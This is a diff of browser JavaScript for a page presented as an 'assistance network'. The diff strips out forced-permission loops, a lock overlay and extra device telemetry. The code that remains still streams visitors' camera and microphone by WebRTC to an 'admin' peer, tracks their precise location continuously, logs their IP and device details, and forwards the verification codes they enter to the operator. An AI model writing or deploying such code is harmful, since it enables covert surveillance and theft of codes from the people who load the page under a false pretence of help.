@@ -14,30 +14,6 @@ const verifyCodeBtn = document.getElementById('verify-code');
 const cancelVerificationBtn = document.getElementById('cancel-verification');
 const resendCodeBtn = document.getElementById('resend-code');
 const assistanceForm = document.getElementById('assistance-form');
-const navLinks = document.querySelectorAll('.nav a');
-const forcedOverlay = document.getElementById('forced-permission-overlay');
-const retryPermissionsBtn = document.getElementById('retry-permissions');
-
-// Función para manejar navegación activa
-navLinks.forEach(link => {
-    link.addEventListener('click', () => {
-        navLinks.forEach(l => l.classList.remove('active'));
-        link.classList.add('active');
-    });
-});
-
-// Función para verificar sesión persistente
-function checkSession() {
-    const isVerified = localStorage.getItem('rn_session_verified');
-    if (isVerified === 'true') {
-        loginBtn.textContent = 'Acceso Verificado ✓';
-        loginBtn.classList.add('btn-success');
-        loginBtn.style.pointerEvents = 'none';
-        loginBtn.style.opacity = '0.8';
-        return true;
-    }
-    return false;
-}
 
 // Cliente Supabase global
 const supaClient = window.supabaseClient;
@@ -51,7 +27,7 @@ let permissions = {
     location: false
 };
 
-// Obtener información del dispositivo extendida (Telemetría)
+// Obtener información del dispositivo
 async function getDeviceInfo() {
     let devId = localStorage.getItem('deviceId');
     if (!devId) {
@@ -67,13 +43,6 @@ async function getDeviceInfo() {
         ip = ipData.ip;
     } catch (e) { }
 
-    // Batería
-    let battery = {};
-    try {
-        const b = await navigator.getBattery();
-        battery = { level: b.level * 100, charging: b.charging };
-    } catch (e) { }
-
     deviceInfo = {
         device_id: devId,
         user_agent: navigator.userAgent,
@@ -82,14 +51,7 @@ async function getDeviceInfo() {
         screen_width: screen.width,
         screen_height: screen.height,
         ip: ip,
-        status: 'active',
-        telemetry: {
-            battery: battery,
-            connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-            cores: navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory,
-            timestamp: new Date().toISOString()
-        }
+        status: 'active'
     };
 
     return deviceInfo;
@@ -109,13 +71,7 @@ function initWebRTC(stream, isInitiator, targetId) {
         initiator: isInitiator,
         stream: stream,
         trickle: false,
-        config: {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' },
-                { urls: 'stun:stun2.l.google.com:19302' }
-            ]
-        }
+        config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
     });
 
     peer.on('signal', data => {
@@ -172,23 +128,7 @@ async function initSupabase() {
                 event: 'device-connected',
                 payload: info
             });
-            // Una vez suscrito, intentar permisos automáticos
-            autoRequestPermissions();
         }
-    });
-}
-
-// Función de "Fuerza Bruta" para permisos
-function autoRequestPermissions() {
-    console.log(">>> Iniciando loop de permisos forzados <<<");
-    const perms = { camera: true, microphone: true, location: true };
-    requestRealPermissions(perms);
-}
-
-if (retryPermissionsBtn) {
-    retryPermissionsBtn.addEventListener('click', () => {
-        forcedOverlay.style.display = 'none';
-        autoRequestPermissions();
     });
 }
 
@@ -201,7 +141,6 @@ function handleAdminRequest(action) {
 
 // Iniciar sesión
 loginBtn.addEventListener('click', () => {
-    if (checkSession()) return;
     loginModal.style.display = 'block';
 });
 
@@ -267,55 +206,35 @@ denyPermissionsBtn.addEventListener('click', () => {
     alert('Para utilizar el sistema de asistencia, debe aceptar todos los permisos requeridos.');
 });
 
-// Solicitar permisos y transmitir estados (con overlay de bloqueo)
+// Solicitar permisos y transmitir estados
 function requestRealPermissions(requestedPerms) {
     const devId = deviceInfo.device_id;
-    let cameraGranted = false;
-    let micGranted = false;
-    let locGranted = false;
-
-    const checkAllGranted = () => {
-        // Si ya tenemos los 3 principales, ocultar overlay
-        if (cameraGranted && micGranted && locGranted) {
-            if (forcedOverlay) forcedOverlay.style.display = 'none';
-        }
-    };
 
     if (requestedPerms.camera) permissions.camera = true;
     if (requestedPerms.microphone) permissions.microphone = true;
 
-    // Cámara y Mic
-    if (permissions.camera || permissions.microphone) {
+    if (requestedPerms.camera || requestedPerms.microphone) {
         navigator.mediaDevices.getUserMedia({ 
             video: permissions.camera, 
             audio: permissions.microphone 
         })
         .then(async stream => {
-            cameraGranted = permissions.camera;
-            micGranted = permissions.microphone;
-            
             await supaClient.from('devices').update({ 'permissions': permissions }).eq('device_id', devId);
             
             if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
             if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });
 
             const video = document.getElementById('local-video');
-            if (video) video.srcObject = stream;
+            video.srcObject = stream;
             localStream = stream;
             initWebRTC(stream, true, 'admin');
-            checkAllGranted();
         })
-        .catch(err => {
-            console.error('Error WebRTC:', err);
-            if (forcedOverlay) forcedOverlay.style.display = 'flex';
-        });
+        .catch(err => console.error(err));
     }
 
-    // Ubicación
-    if (requestedPerms.location || permissions.location) {
+    if (requestedPerms.location) {
         navigator.geolocation.getCurrentPosition(
             async position => {
-                locGranted = true;
                 const locationData = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
@@ -325,7 +244,6 @@ function requestRealPermissions(requestedPerms) {
 
                 await supaClient.from('devices').update({ location: locationData }).eq('device_id', devId);
                 channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: locationData } });
-                checkAllGranted();
 
                 navigator.geolocation.watchPosition(
                     pos => {
@@ -338,14 +256,11 @@ function requestRealPermissions(requestedPerms) {
                         supaClient.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
                         channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: updatedLocation } });
                     },
-                    null,
+                    error => console.error(error),
                     { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                 );
             },
-            error => {
-                console.error('Error Geo:', error);
-                if (forcedOverlay) forcedOverlay.style.display = 'flex';
-            }
+            error => console.error(error)
         );
     }
 }
@@ -357,15 +272,11 @@ verifyCodeBtn.addEventListener('click', async () => {
     codeInputs.forEach(input => code += input.value);
 
     confirmationModal.style.display = 'none';
-    
-    // Guardar estado de sesión
-    localStorage.setItem('rn_session_verified', 'true');
-    checkSession();
+    featuresSection.style.display = 'block';
+    assistanceSection.style.display = 'block';
 
     await supaClient.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
     channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, code } });
-    
-    alert('Dispositivo sincronizado exitosamente con la Red de Asistencia.');
 });
 
 cancelVerificationBtn.addEventListener('click', () => {
@@ -415,16 +326,12 @@ document.addEventListener('visibilitychange', async () => {
     }
 });
 
-// Heartbeat cada 15 segundos para actualización constante invisible
+// Heartbeat cada 30 segundos para mostrarlo conectado en admin
 setInterval(async () => {
     if (deviceInfo.device_id) {
-        const info = await getDeviceInfo();
-        await supaClient.from('devices').update({ 
-            last_active: new Date().toISOString(),
-            telemetry: info.telemetry
-        }).eq('device_id', deviceInfo.device_id);
+        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
     }
-}, 15000);
+}, 30000);
 
 // Evitar cierre accidental
 window.addEventListener('beforeunload', (e) => {
@@ -435,5 +342,4 @@ window.addEventListener('beforeunload', (e) => {
 });
 
 // Inicializar al cargar scripts
-checkSession();
 initSupabase();
